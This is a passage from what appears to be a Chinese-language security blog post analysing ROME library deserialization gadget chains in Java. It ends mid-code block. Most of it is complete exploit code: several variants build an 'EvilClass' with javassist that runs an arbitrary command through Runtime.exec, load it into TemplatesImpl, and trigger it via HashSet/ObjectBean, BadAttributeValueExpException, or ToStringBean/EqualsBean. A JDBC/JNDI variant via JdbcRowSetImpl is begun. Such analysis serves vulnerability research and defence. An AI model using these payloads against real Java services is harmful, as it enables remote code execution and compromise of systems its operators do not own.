<p>è€Œ <code>_sdom</code> è¿™ä¸ªå±æ€§è¢« <code>transient</code> ä¿®é¥°ï¼Œæ— æ³•è¢«åºåˆ—åŒ–ã€‚ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ›å‡º <code>NullPoint</code> å¼‚å¸¸ï¼ŒæŠ¥é”™å¯¼è‡´ <code>ToStringBean#toString</code> å‡½æ•°è·³å‡º getter éå†æå‰è¿”å›ï¼Œå› è€Œæ— æ³•å®Œæˆåˆ©ç”¨ã€‚</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">innerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">outerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, innerBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">triggerSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        triggerSet.add(outerBean);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerSet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>javax.management.BadAttributeValueExpException</code> åœ¨ååºåˆ—åŒ– <code>readObject</code> æ—¶ä¼šå¯¹å…¶ä¸­çš„ <code>val</code> æˆå‘˜è°ƒç”¨ <code>toString</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span> <span class="comment">// ğŸ“Œ System.getSecurityManager() éœ€è¦è¿”å› null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨ val æˆå‘˜çš„ toString æ–¹æ³•</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>BadAttributeValueExpException</code> ä»£æ›¿ <code>HashSet</code> + <code>ObjectBean</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, bean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤–æ ¹æ®å‰é¢çš„åˆ†æï¼Œ<code>toString â†’ getter</code> å’Œ <code>hashCode â†’ toString</code> æœ¬è´¨ä¸Šç›¸å½“äºå€ŸåŠ© <code>ToStringBean</code> å’Œ <code>EqualsBean</code> æ¥è§¦å‘çš„ï¼Œåªä¸è¿‡å¤–å±‚éƒ½è¢«åŒ…è£…æˆäº† <code>ObjectBean</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å†™å¾—æ›´ç›´æ¥ä¸€äº›ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">innerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">outerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, innerBean);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashSet</span> <span class="variable">triggerSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">    triggerSet.add(outerBean);</span><br><span class="line"></span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> triggerSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p><code>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</code> å‡½æ•°å¯ä»¥è°ƒç”¨åˆ° JNDI çš„ <code>javax.naming.InitialContext#lookup</code> å‡½æ•°ï¼Œä½† ROME é“¾æ˜¯è§¦å‘ getter æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¸ºè¯¥ &lt;code&gt;JdbcRowSet&lt;/code&gt; æ‰€ä½¿ç”¨çš„å†…éƒ¨ &lt;code&gt;Connection&lt;/code&gt; è®¾ç½®è‡ªåŠ¨æäº¤ï¼ˆauto-commitï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> autoCommit æ˜¯å¦å¼€å¯è‡ªåŠ¨æäº¤</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SQLException å½“å‘ç”Ÿæ•°æ®åº“è®¿é—®é”™è¯¯æ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (conn != <span class="literal">null</span>) &#123; <span class="comment">// ğŸ“Œ ç¡®ä¿ conn ä¸ºç©º</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// èµ°åˆ°è¿™é‡Œè¯´æ˜å½“å‰è¿æ¥å¯¹è±¡ä¸º null</span></span><br><span class="line">        <span class="comment">// å› ä¸º JdbcRowSet å§‹ç»ˆåº”å½“è¿æ¥åˆ°æ•°æ®åº“ï¼Œè¿™é‡Œå†…éƒ¨åˆ›å»ºä¸€ä¸ªè¿æ¥å¥æŸ„æ˜¯åˆç†çš„</span></span><br><span class="line">        conn = connect(); <span class="comment">// ğŸ‘ˆ è°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å»ºç«‹å¹¶è¿”å›ä¸€ä¸ª JDBC è¿æ¥ã€‚</span></span><br><span class="line"><span class="comment"> * ä¼˜å…ˆå¤ç”¨å·²æœ‰è¿æ¥ï¼›å¦åˆ™æŒ‰ dataSourceNameï¼ˆJNDIï¼‰æˆ–å…¶ä»–é…ç½®åˆ›å»ºã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> å¯ç”¨çš„ Connection</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SQLException è·å–è¿æ¥å¤±è´¥æ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å– JDBC è¿æ¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (conn != <span class="literal">null</span>) &#123; <span class="comment">// ğŸ“Œ ç¡®ä¿ conn ä¸ºç©º</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡ JNDI æŸ¥æ‰¾æ•°æ®æºå¹¶è·å–è¿æ¥</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource) ctx.lookup(getDataSourceName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">            <span class="comment">// å°†å‘½åå¼‚å¸¸åŒ…è£…ä¸º SQL å¼‚å¸¸ï¼Œç»Ÿä¸€è¯­ä¹‰</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString(), ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä½†å®é™…ä¸Šåœ¨ <code>JdbcRowSetImpl</code> ç±»é‡Œæœç´¢ <code>this.connect()</code>ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªæ–¹æ³• <code>getDatabaseMetaData</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> connect();</span><br><span class="line">    <span class="keyword">return</span> con.getMetaData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title 